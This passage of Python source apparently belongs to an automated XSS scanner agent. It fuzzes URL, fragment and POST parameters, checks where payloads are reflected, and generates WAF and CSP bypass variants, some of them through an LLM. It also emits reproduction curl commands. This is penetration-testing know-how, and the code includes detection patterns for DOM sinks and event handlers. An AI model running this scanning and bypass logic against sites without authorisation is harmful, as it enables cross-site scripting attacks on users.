        if re.search(rf'on\w+\s*=\s*["\'][^"\']*{escaped}', response_html, re.IGNORECASE):
            return "event_handler"

        # 3. javascript: URI scheme (href, src, action attributes)
        # Handle both cases:
        # a) Payload without javascript: prefix in href="javascript:PAYLOAD"
        # b) Payload with javascript: prefix in href="javascript:alert(1)"
        if payload.lower().startswith('javascript:'):
            # Payload already has javascript: - look for it directly in href/src/action
            if re.search(rf'(href|src|action)\s*=\s*["\']?{escaped}', response_html, re.IGNORECASE):
                return "javascript_uri"
        else:
            # Payload without javascript: - look for it inside javascript: URI
            if re.search(rf'(href|src|action)\s*=\s*["\']?javascript:[^"\']*{escaped}', response_html, re.IGNORECASE):
                return "javascript_uri"

        # 4. Template expressions (Angular/Vue/etc.)
        if re.search(rf'\{{\{{[^}}]*{escaped}[^}}]*\}}\}}', response_html) or re.search(rf'\$\{{[^}}]*{escaped}[^}}]*\}}', response_html):
            return "template_expression"

        return None

    def _requires_browser_validation(self, payload: str, response_html: str) -> bool:
        """
        Determine if Playwright browser validation is required.
        """
        # 1. DOM-based sink patterns in payload
        dom_sinks = [
            "location.hash", "location.search", "document.URL",
            "document.referrer", "postMessage", "innerHTML",
            "outerHTML", "document.write"
        ]
        for sink in dom_sinks:
            if sink.lower() in payload.lower():
                return True

        # 2. Event handlers requiring interaction
        interaction_patterns = [
            r'autofocus.*onfocus',
            r'onfocus.*autofocus',
            r'onblur\s*=',
            r'onmouseover\s*=',
            r'onmouseenter\s*='
        ]
        for pattern in interaction_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                return True

        # 3. Complex sink analysis in response (not payload)
        complex_sinks = [
            r'eval\s*\(',
            r'Function\s*\(',
            r'setTimeout\s*\([^)]*["\']',
            r'setInterval\s*\([^)]*["\']'
        ]
        for pattern in complex_sinks:
            if re.search(pattern, response_html):
                return True

        # 4. Template syntax in payload (CSTI - Angular, Vue, etc.)
        # These require browser to evaluate if JS framework processes them
        template_patterns = [
            r'\{\{',      # Angular/Vue mustache syntax
            r'\$\{',      # JS template literals
            r'#\{',       # Ruby ERB / Pug
            r'\{%',       # Jinja2/Twig
            r'<%',        # EJS/ASP
        ]
        for pattern in template_patterns:
            if re.search(pattern, payload):
                return True

        # 5. Check if response has Angular/Vue and payload reflected
        if re.search(r'angular|ng-app|vue\.js|v-bind|v-model', response_html, re.IGNORECASE):
            # Framework detected - any reflection needs browser validation
            return True

        return False

    def _fragment_build_url(self, payload: str) -> str:
        """Build fragment URL with payload in hash (bypasses WAF)."""
        from urllib.parse import urlparse
        parsed = urlparse(self.url)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}#{payload}"

    def _fragment_build_finding(
        self,
        param: str,
        payload: str,
        result: Any
    ) -> XSSFinding:
        """Build XSS finding from validated fragment injection."""
        evidence = result.details or {}
        evidence["method"] = result.method
        evidence["screenshot_path"] = result.screenshot_path
        if result.console_logs:
            evidence["console_logs"] = result.console_logs

        return XSSFinding(
            url=self.url,
            parameter=f"#fragment (bypassed {param})",
            payload=payload,
            context="dom_xss_fragment",
            validation_method=f"vision+{result.method}",
            evidence=evidence,
            confidence=1.0,
            status="VALIDATED_CONFIRMED",
            validated=True,
            screenshot_path=result.screenshot_path,
            reflection_context="location.hash → innerHTML",
            surviving_chars="N/A (client-side)"
        )

    async def _test_fragment_xss(
        self,
        param: str,
        interactsh_url: str,
        screenshots_dir: Path
    ) -> Optional[XSSFinding]:
        """
        Test Fragment-based XSS (DOM XSS via location.hash).
        This bypasses WAFs because fragments (#payload) don't reach the server.
        Level 7+ targets often use location.hash in innerHTML/eval, creating DOM XSS.
        """
        dashboard.log(f"[{self.name}] 🔗 Testing FRAGMENT XSS (bypassing WAF via location.hash)...", "INFO")

        for fragment_template in self.FRAGMENT_PAYLOADS:
            payload = fragment_template.replace("{{interactsh_url}}", interactsh_url)
            fragment_url = self._fragment_build_url(payload)

            dashboard.set_current_payload(payload[:60], "Fragment XSS", "Testing")
            logger.info(f"[{self.name}] Testing Fragment: {fragment_url}")

            try:
                result = await self.verifier.verify_xss(
                    url=fragment_url,
                    screenshot_dir=str(screenshots_dir),
                    timeout=10.0
                )

                if result.success:
                    dashboard.log(f"[{self.name}] 🎯 FRAGMENT XSS SUCCESS! ({result.method})", "SUCCESS")
                    return self._fragment_build_finding(param, payload, result)

            except Exception as e:
                logger.debug(f"Fragment test failed for {payload[:30]}: {e}")
                continue

        logger.info(f"[{self.name}] No Fragment XSS found after testing {len(self.FRAGMENT_PAYLOADS)} payloads")
        return None
    
    async def _discover_params(self) -> List[str]:
        """Discover injectable parameters from the page."""
        from bs4 import BeautifulSoup
        from urllib.parse import urlparse, parse_qs

        discovered = []

        # 1. Extract from URL
        parsed = urlparse(self.url)
        for param in parse_qs(parsed.query).keys():
            discovered.append(param)

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

        # 2. Extract from HTML forms
        try:
            # Use HTTPClientManager for proper connection management (v2.4)
            async with http_manager.session(ConnectionProfile.STANDARD) as session:
                async with session.get(self.url, headers=headers, ssl=False) as resp:
                    html = await resp.text()

            soup = BeautifulSoup(html, 'html.parser')

            for inp in soup.find_all(['input', 'textarea', 'select']):
                name = inp.get('name')
                if name and name not in discovered:
                    discovered.append(name)

        except Exception as e:
            logger.warning(f"Param discovery error: {e}")

        # 3. Aggressively add common vulnerable parameters (Burp-equivalent)
        # Added (2026-02-01): Even if not found, we test these as they are common hidden vectors
        common_vuln_params = [
            "category", "search", "q", "query", "filter", "sort", 
            "template", "view", "page", "lang", "theme", "type", "action", "mode", "tab"
        ]
        for param in common_vuln_params:
            if param not in discovered:
                discovered.append(param)
                logger.debug(f"[{self.name}] Added common vuln parameter for fuzzed testing: {param}")

        # PRIORITIZE parameters (high-value first)
        return self._prioritize_params(discovered)

    # =========================================================================
    # PARAMETER PRIORITIZATION: Test high-value params first
    # =========================================================================

    # Parameters historically more prone to XSS (ordered by likelihood)
    HIGH_PRIORITY_PARAMS = [
        # Search/Query - Most common XSS vectors
        "q", "query", "search", "s", "keyword", "keywords", "term", "terms",
        # ADDED (2026-02-01): Common GET params that Burp tests but we missed
        "category", "filter", "sort", "type", "action", "mode", "tab",
        # Redirect/URL - Often unvalidated
        "url", "redirect", "redirect_url", "return", "return_url", "returnUrl",
        "next", "goto", "destination", "dest", "target", "redir", "redirect_to",
        "continue", "forward", "ref", "referrer",
        # Callback/JSONP - JavaScript context
        "callback", "cb", "jsonp", "jsonpcallback", "call",
        # Input/Display - User-facing content
        "input", "text", "value", "data", "content", "body", "message", "msg",
        "name", "username", "user", "email", "title", "subject", "comment",
        # File/Path - Sometimes reflected
        "file", "filename", "path", "page", "view", "template",
        # Error/Debug - Often reflected in error messages
        "error", "err", "debug", "msg", "message", "alert",
        # ID/Reference - Sometimes used in display
        "id", "item", "product", "article", "post",
    ]

    def _prioritize_params(self, params: List[str]) -> List[str]:
        """
        Prioritize parameters for testing.
        High-priority params (search, callback, redirect) are tested first.
        """
        high_priority = []
        medium_priority = []
        low_priority = []

        for param in params:
            param_lower = (param or "").lower()

            # Check if it's a high-priority param
            is_high = False
            for hp in self.HIGH_PRIORITY_PARAMS:
                if hp in param_lower or param_lower in hp:
                    is_high = True
                    break

            if is_high:
                high_priority.append(param)
            elif any(x in param_lower for x in ["id", "num", "count", "page", "size", "limit", "offset"]):
                # Numeric params are usually less vulnerable
                low_priority.append(param)
            else:
                medium_priority.append(param)

        # Return prioritized list
        prioritized = high_priority + medium_priority + low_priority

        if high_priority:
            logger.info(f"[{self.name}] 🎯 High-priority params detected: {high_priority}")
            dashboard.log(f"[{self.name}] 🎯 Testing high-priority params first: {', '.join(high_priority[:5])}", "INFO")

        return prioritized

    # =========================================================================
    # ADDITIONAL ATTACK VECTORS: POST, Cookies
    # =========================================================================

    async def _post_send_request(
        self,
        form_action: str,
        test_data: Dict[str, str]
    ) -> Optional[str]:
        """Send POST request and return response HTML."""
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
            }

            # Use HTTPClientManager for proper connection management (v2.4)
            async with http_manager.session(ConnectionProfile.PROBE) as session:
                async with session.post(
                    form_action,
                    data=test_data,
                    headers=headers,
                    ssl=False,
                    allow_redirects=True
                ) as resp:
                    text = await resp.text()
                    # This response reaches the confirmation gate through _validate();
                    # without recording its content type the gate would judge it on the
                    # LAST GET's headers, and without the request the repro stamp would
                    # replay that GET instead of this POST.
                    self._last_response_content_type = resp.headers.get("Content-Type", "")
                    self._last_response_csp = resp.headers.get(
                        "Content-Security-Policy", "")
                    self._last_confirming_request = {
                        "method": "POST", "url": form_action, "headers": dict(headers),
                        "body": urllib.parse.urlencode(test_data),
                        "body_content_type": "application/x-www-form-urlencoded",
                    }
                    self._last_confirming_response = {"status": resp.status, "text": text}
                    return text
        except Exception as e:
            logger.debug(f"POST request failed: {e}")
            self._last_response_content_type = ""
            self._last_response_csp = ""
            return None

    def _post_build_finding(
        self,
        form_action: str,
        param: str,
        payload: str,
        evidence: Dict
    ) -> XSSFinding:
        """Build XSS finding from validated POST injection."""
        evidence["vector"] = "POST"
        evidence["form_action"] = form_action

        return XSSFinding(
            url=form_action,
            parameter=f"POST:{param}",
            payload=payload,
            context="POST form submission",
            validation_method="post_injection",
            evidence=evidence,
            confidence=0.9,
            status="VALIDATED_CONFIRMED",
            validated=True,
            screenshot_path=evidence.get("screenshot_path"),
            reflection_context="post_body"
        )

    async def _test_post_params(
        self,
        form_action: str,
        post_params: Dict[str, str],
        interactsh_url: str,
        screenshots_dir: Path
    ) -> Optional[XSSFinding]:
        """Test POST parameters for XSS."""
        dashboard.log(f"[{self.name}] 📝 Testing POST form: {form_action}", "INFO")

        for param, original_value in post_params.items():
            if self._max_impact_achieved:
                break

            for payload_template in self.GOLDEN_PAYLOADS[:10]:
                payload = payload_template.replace("{{interactsh_url}}", interactsh_url)
                test_data = post_params.copy()
                test_data[param] = payload

                response_html = await self._post_send_request(form_action, test_data)
                if not response_html:
                    continue

                # Check reflection
                if payload not in response_html and payload[:30] not in response_html:
                    continue

                dashboard.log(f"[{self.name}] 🎯 POST param '{param}' reflects payload!", "SUCCESS")

                validated, evidence = await self._validate(
                    param, payload, response_html, screenshots_dir
                )

                if validated:
                    return self._post_build_finding(form_action, param, payload, evidence)

        return None

    async def _fetch_page_forms(self, url: str) -> Optional[str]:
        """Fetch page HTML for form discovery."""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

        try:
            # Use HTTPClientManager for proper connection management (v2.4)
            async with http_manager.session(ConnectionProfile.STANDARD) as session:
                async with session.get(url, headers=headers, ssl=False) as resp:
                    return await resp.text()
        except Exception as e:
            logger.warning(f"Failed to fetch page for form discovery: {e}")
            return None

    def _extract_form_data(self, form, base_url: str) -> Tuple[str, Dict[str, str]]:
        """Extract form action URL and parameters from form element."""
        from urllib.parse import urljoin

        method = (form.get('method') or 'get').lower()
        if method != 'post':
            return "", {}

        action = form.get('action', '')
        form_action = urljoin(base_url, action) if action else base_url

        # Extract form inputs
        post_params = {}
        for inp in form.find_all(['input', 'textarea', 'select']):
            name = inp.get('name')
            if name:
                value = inp.get('value', '')
                post_params[name] = value

        return form_action, post_params

    async def _discover_and_test_post_forms(
        self,
        interactsh_url: str,
        screenshots_dir: Path
    ) -> List[XSSFinding]:
        """Discover POST forms and test them for XSS."""
        from bs4 import BeautifulSoup

        findings = []
        html = await self._fetch_page_forms(self.url)
        if not html:
            return findings

        soup = BeautifulSoup(html, 'html.parser')

        for form in soup.find_all('form'):
            form_action, post_params = self._extract_form_data(form, self.url)
            if not post_params:
                continue

            finding = await self._test_post_params(
                form_action, post_params, interactsh_url, screenshots_dir
            )
            if finding:
                findings.append(finding)
                if self._max_impact_achieved:
                    break

        return findings
    
    async def handle_validation_feedback(
        self,
        feedback: ValidationFeedback
    ) -> Optional[Dict[str, Any]]:
        """
        Recibe feedback del AgenticValidator y genera una variante adaptada.

        Este método se llama cuando el validador no pudo ejecutar un payload
        y necesita una variante basada en el contexto observado.

        Args:
            feedback: Información detallada sobre por qué falló el payload

        Returns:
            Diccionario con el nuevo payload y metadata, o None si no hay variante
        """
        logger.info(
            f"[XSSAgent] Received validation feedback for {feedback.parameter}: "
            f"reason={feedback.failure_reason.value}"
        )

        original = feedback.original_payload

        # Try specific strategy for failure reason
        variant, method = await self._generate_variant_for_reason(feedback, original)

        # Fallback to LLM if no variant generated
        if not variant or variant == original:
            variant, method = await self._generate_llm_fallback_variant(feedback, original)

        # Guard: variant must be unique and different from original
        if not variant:
            logger.warning("[XSSAgent] Could not generate unique variant")
            return None

        if variant == original:
            logger.warning("[XSSAgent] Generated variant same as original")
            return None

        if feedback.was_variant_tried(variant):
            logger.warning("[XSSAgent] Generated variant already tried")
            return None

        logger.info(f"[XSSAgent] Generated variant via {method}: {variant[:60]}...")
        return {
            "payload": variant,
            "method": method,
            "parent_payload": original,
            "adaptation_reason": feedback.failure_reason.value
        }

    async def _generate_variant_for_reason(
        self,
        feedback: ValidationFeedback,
        original: str
    ) -> Tuple[Optional[str], str]:
        """Generate variant based on specific failure reason."""
        reason = feedback.failure_reason

        # Guard: WAF blocked
        if reason == FailureReason.WAF_BLOCKED:
            return await self._handle_waf_blocked(original)

        # Guard: Context mismatch
        if reason == FailureReason.CONTEXT_MISMATCH:
            return self._handle_context_mismatch(feedback, original)

        # Guard: Encoding stripped
        if reason == FailureReason.ENCODING_STRIPPED:
            return self._handle_encoding_stripped(feedback, original)

        # Guard: Partial reflection
        if reason == FailureReason.PARTIAL_REFLECTION:
            return self._handle_partial_reflection()

        # Guard: CSP blocked
        if reason == FailureReason.CSP_BLOCKED:
            return self._handle_csp_blocked()

        # Guard: Timing issues
        if reason in [FailureReason.TIMING_ISSUE, FailureReason.DOM_NOT_READY]:
            return self._handle_timing_issue(original)

        # Guard: No execution
        if reason == FailureReason.NO_EXECUTION:
            return await self._handle_no_execution(feedback, original)

        return None, "unknown"

    async def _handle_waf_blocked(self, original: str) -> Tuple[Optional[str], str]:
        """Handle WAF blocked scenario."""
        logger.info("[XSSAgent] WAF detected, trying encoded variants")
        encoded_variants = await self._get_waf_optimized_payloads([original], max_variants=1)
        if encoded_variants and encoded_variants[0] != original:
            return encoded_variants[0], "waf_bypass"
        return None, "waf_bypass"

    def _handle_context_mismatch(
        self,
        feedback: ValidationFeedback,
        original: str
    ) -> Tuple[Optional[str], str]:
        """Handle context mismatch scenario.
        Delegates to bugtrace.agents.xss.feedback.handle_context_mismatch."""
        logger.info(f"[XSSAgent] Context mismatch, adapting to: {feedback.detected_context}")
        return _pure_handle_context_mismatch(original, feedback.detected_context)

    def _handle_encoding_stripped(
        self,
        feedback: ValidationFeedback,
        original: str
    ) -> Tuple[Optional[str], str]:
        """Handle encoding stripped scenario.
        Delegates to bugtrace.agents.xss.feedback.handle_encoding_stripped."""
        logger.info(f"[XSSAgent] Chars stripped: {feedback.stripped_chars}")
        return _pure_handle_encoding_stripped(original, feedback.stripped_chars)

    def _handle_partial_reflection(self) -> Tuple[str, str]:
        """Handle partial reflection scenario.
        Delegates to bugtrace.agents.xss.feedback.handle_partial_reflection."""
        logger.info("[XSSAgent] Partial reflection, trying simpler payload")
        return _pure_handle_partial_reflection()

    def _handle_csp_blocked(self) -> Tuple[Optional[str], str]:
        """Handle CSP blocked scenario.
        Delegates to bugtrace.agents.xss.feedback.handle_csp_blocked."""
        logger.info("[XSSAgent] CSP blocked, trying CSP bypass")
        return _pure_handle_csp_blocked()

    def _handle_timing_issue(self, original: str) -> Tuple[str, str]:
        """Handle timing issue scenario.
        Delegates to bugtrace.agents.xss.feedback.handle_timing_issue."""
        logger.info("[XSSAgent] Timing issue, adding load event")
        return _pure_handle_timing_issue(original)

    async def _handle_no_execution(
        self,
        feedback: ValidationFeedback,
        original: str
    ) -> Tuple[Optional[str], str]:
        """Handle no execution scenario."""
        logger.info("[XSSAgent] No execution, trying different technique")
        llm_result = await self._llm_generate_bypass(
            original,
            feedback.reflected_portion or "",
            self.interactsh.get_url("xss_agent_bypass") if self.interactsh else ""
        )
        if llm_result:
            return llm_result.get('payload'), "llm_alternative"
        return None, "llm_alternative"

    async def _generate_llm_fallback_variant(
        self,
        feedback: ValidationFeedback,
        original: str
    ) -> Tuple[Optional[str], str]:
        """Generate variant using LLM fallback."""
        logger.info("[XSSAgent] Falling back to LLM generation")
        llm_result = await self._llm_generate_bypass(
            original,
            feedback.reflected_portion or "",
            self.interactsh.get_url("xss_agent_fallback") if self.interactsh else ""
        )
        if llm_result:
            return llm_result.get('payload'), "llm_fallback"
        return None, "llm_fallback"

    def _extract_js_code(self, payload: str) -> str:
        """Delegates to bugtrace.agents.xss.feedback.extract_js_code."""
        return _pure_extract_js_code(payload)

    def _adapt_for_attribute(self, js_code: str) -> str:
        """Delegates to bugtrace.agents.xss.feedback.adapt_for_attribute."""
        return _pure_adapt_for_attribute(js_code)

    def _adapt_for_script(self, js_code: str) -> str:
        """Delegates to bugtrace.agents.xss.feedback.adapt_for_script."""
        return _pure_adapt_for_script(js_code)

    def _adapt_for_html(self, js_code: str) -> str:
        """Delegates to bugtrace.agents.xss.feedback.adapt_for_html."""
        return _pure_adapt_for_html(js_code)

    def _adapt_for_comment(self, js_code: str) -> str:
        """Delegates to bugtrace.agents.xss.feedback.adapt_for_comment."""
        return _pure_adapt_for_comment(js_code)

    def _adapt_for_style(self, js_code: str) -> str:
        """Delegates to bugtrace.agents.xss.feedback.adapt_for_style."""
        return _pure_adapt_for_style(js_code)

    def _adapt_to_context(self, payload: str, context: Optional[str]) -> str:
        """Delegates to bugtrace.agents.xss.feedback.adapt_to_context."""
        return _pure_adapt_to_context(payload, context)

    def _encode_stripped_chars(self, payload: str, stripped: List[str]) -> str:
        """Delegates to bugtrace.agents.xss.feedback.encode_stripped_chars."""
        return _pure_encode_stripped_chars(payload, stripped)

    def _generate_csp_bypass_payload(self) -> str:
        """Delegates to bugtrace.agents.xss.feedback.generate_csp_bypass_payload."""
        return _pure_generate_csp_bypass_payload()

    def _bypass_try_waf_encoding(
        self,
        original_payload: str,
        waf_signature: str,
        tried_variants: List[str]
    ) -> Optional[str]:
        """Generate WAF bypass variant using Q-Learning encoding.
        Delegates to bugtrace.agents.xss.waf.bypass_try_waf_encoding."""
        if not waf_signature or waf_signature.lower() == "no identificado":
            return None

        logger.info(f"[XSSAgent] WAF detected ({waf_signature}), using intelligent encoding...")
        # NOTE: _get_waf_optimized_payloads is async but called sync here.
        # This is a pre-existing issue preserved for backward compatibility.
        encoded_variants = self._get_waf_optimized_payloads([original_payload], max_variants=5)

        variant, _ = _pure_bypass_try_waf_encoding(
            original_payload, waf_signature, tried_variants,
            encoded_variants if isinstance(encoded_variants, list) else []
        )
        if variant:
            logger.info(f"[XSSAgent] Generated WAF bypass variant: {variant[:80]}...")
        return variant

    def _bypass_try_char_obfuscation(
        self,
        stripped_chars: str,
        tried_variants: List[str]
    ) -> Optional[str]:
        """Generate bypass variant using character obfuscation.
        Delegates to bugtrace.agents.xss.waf.bypass_try_char_obfuscation."""
        if not stripped_chars:
            return None
        logger.info(f"[XSSAgent] Characters filtered ({stripped_chars}), using obfuscation...")
        variant, _ = _pure_bypass_try_char_obfuscation(stripped_chars, tried_variants)
        if variant:
            logger.info(f"[XSSAgent] Generated obfuscation variant: {variant[:80]}...")
        return variant

    def _bypass_try_context_specific(
        self,
        detected_context: str,
        tried_variants: List[str]
    ) -> Optional[str]:
        """Generate bypass variant based on detected HTML context.
        Delegates to bugtrace.agents.xss.waf.bypass_try_context_specific."""
        if not detected_context:
            return None
        variant, _ = _pure_bypass_try_context_specific(detected_context, tried_variants)
        if variant:
            logger.info(f"[XSSAgent] Generated context-specific variant: {variant[:80]}...")
        return variant

    def _bypass_try_universal_payloads(
        self,
        tried_variants: List[str]
    ) -> Optional[str]:
        """Generate universal bypass payloads as fallback.
        Delegates to bugtrace.agents.xss.waf.bypass_try_universal_payloads."""
        variant, _ = _pure_bypass_try_universal_payloads(tried_variants)
        if variant:
            logger.info(f"[XSSAgent] Generated universal variant: {variant[:80]}...")
        return variant

    async def generate_bypass_variant(
        self,
        original_payload: str,
        failure_reason: str,
        waf_signature: Optional[str] = None,
        stripped_chars: Optional[str] = None,
        detected_context: Optional[str] = None,
        tried_variants: Optional[List[str]] = None
    ) -> Optional[str]:
        """
        Generate a bypass XSS payload variant based on failure feedback.
        Delegates to bugtrace.agents.xss.waf.generate_bypass_variant.

        Args:
            original_payload: The payload that failed
            failure_reason: Why it failed (waf_blocked, chars_filtered, etc.)
            waf_signature: WAF identifier if detected
            stripped_chars: Characters that were filtered
            detected_context: HTML context where payload was reflected
            tried_variants: List of already-tried variants

        Returns:
            New payload string, or None if all strategies exhausted
        """
        logger.info(f"[XSSAgent] Generating bypass variant for failed payload: {original_payload[:50]}...")
        tried = tried_variants or []

        # Pre-compute encoded variants for WAF bypass (async pipeline)
        encoded_variants = []
        if waf_signature and waf_signature.lower() != "no identificado":
            encoded_variants = await self._get_waf_optimized_payloads([original_payload], max_variants=5)

        result = _pure_generate_bypass_variant(
            original_payload=original_payload,
            failure_reason=failure_reason,
            waf_signature=waf_signature,
            stripped_chars=stripped_chars,
            detected_context=detected_context,
            tried_variants=tried,
            encoded_variants=encoded_variants,
        )

        if not result:
            logger.warning("[XSSAgent] Could not generate new variant (all strategies exhausted)")
        return result

    def _finding_to_dict(self, finding: XSSFinding) -> Dict:
        """Convert finding to dictionary for JSON output."""
        # 2026-01-24 FIX: Generate reproduction URL/command
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        try:
            if finding.http_method == "POST":
                reproduction = f"# POST request to trigger XSS:\ncurl -X POST -d '{finding.parameter}={finding.payload}' '{finding.url}'"
                test_url = finding.url
            else:
                parsed = urlparse(finding.url)
                qs = parse_qs(parsed.query)
                qs[finding.parameter] = [finding.payload]
                new_query = urlencode(qs, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))
                reproduction = f"# Open in browser to trigger XSS:\n{test_url}"
        except Exception:
            reproduction = f"# XSS: Inject payload '{finding.payload}' in parameter '{finding.parameter}'"
            test_url = finding.url

        # Seed enrichment: nested `repro` object with the confirming request (auth masked),
        # consumed by the WEB AI Repeater. Prefer the LIVE-captured request; if it didn't
        # survive (e.g. the browser/L5-validated path replaces evidence), reconstruct the
        # exploit request from the finding's own real data so `repro` is never null.
        _cr = finding.evidence.get("confirming_request")
        _capture = finding.evidence.get("capture_method")
        if not _cr:
            if (finding.http_method or "GET").upper() == "POST":
                _cr = {"method": "POST", "url": finding.url, "headers": {},
                       "body": f"{finding.parameter}={finding.payload}",
                       "body_content_type": "application/x-www-form-urlencoded"}
            else:
                _cr = {"method": "GET", "url": test_url, "headers": {}, "body": None, "body_content_type": None}
            _capture = "reconstructed_from_finding"
        repro = {
            "confirming_request": _cr,
            "confirming_response": finding.evidence.get("confirming_response"),
            "readback_request": finding.evidence.get("readback_request"),
            "auth": finding.evidence.get("repro_auth"),
            "capture_method": _capture,
        }
        http_request_str = _build_raw_http(_cr)

        return {
            "type": "XSS",
            "url": finding.url,
            "parameter": finding.parameter,
            "payload": finding.payload,
            "context": finding.context,
            "reflection_context": finding.reflection_context,
            "surviving_chars": finding.surviving_chars,
            "validation_method": finding.validation_method,
            "evidence": finding.evidence,
            "confidence": finding.confidence,
            "screenshot_path": finding.screenshot_path, # Fixed key for WB mapping
            "validated": finding.validated,  # Use authority flag directly
            "status": finding.status,
            "severity": normalize_severity("HIGH").value,  # Standardized uppercase severity
            "cwe_id": get_cwe_for_vuln("XSS"),  # CWE-79
            "cve_id": "N/A",  # XSS vulnerabilities are class-based, not specific CVEs
            "remediation": get_remediation_for_vuln("XSS"),
            "description": f"Reflected XSS confirmed in parameter '{finding.parameter}'. Context: {finding.reflection_context}. Payload executed successfully via {finding.validation_method}.",
            "reproduction": reproduction,
            # HTTP evidence fields
            "http_request": http_request_str,
            "http_response": finding.evidence.get("http_response", finding.evidence.get("page_html", "")[:500] if finding.evidence.get("page_html") else ""),
            "repro": repro,  # seed enrichment: real confirming request for the AI Repeater
            # NEW FIELDS
            "xss_type": finding.xss_type,
            "injection_context_type": finding.injection_context_type,
            "vulnerable_code_snippet": finding.vulnerable_code_snippet,
            "server_escaping": finding.server_escaping,
            "escape_bypass_technique": finding.escape_bypass_technique,
            "bypass_explanation": finding.bypass_explanation,
            "exploit_url": finding.exploit_url,
            "exploit_url_encoded": finding.exploit_url_encoded,
            "verification_methods": finding.verification_methods,
            "verification_warnings": finding.verification_warnings,
            "reproduction_steps": finding.reproduction_steps,
            "successful_payloads": finding.successful_payloads or [],
            "http_method": finding.http_method
        }


# =============================================================================
# Convenience function
# =============================================================================

async def run_xss_scan(url: str, params: List[str] = None, report_dir: Path = None) -> Dict:
    """Run XSS scan on target URL."""
    agent = XSSAgent(url=url, params=params, report_dir=report_dir)
    return await agent.run()
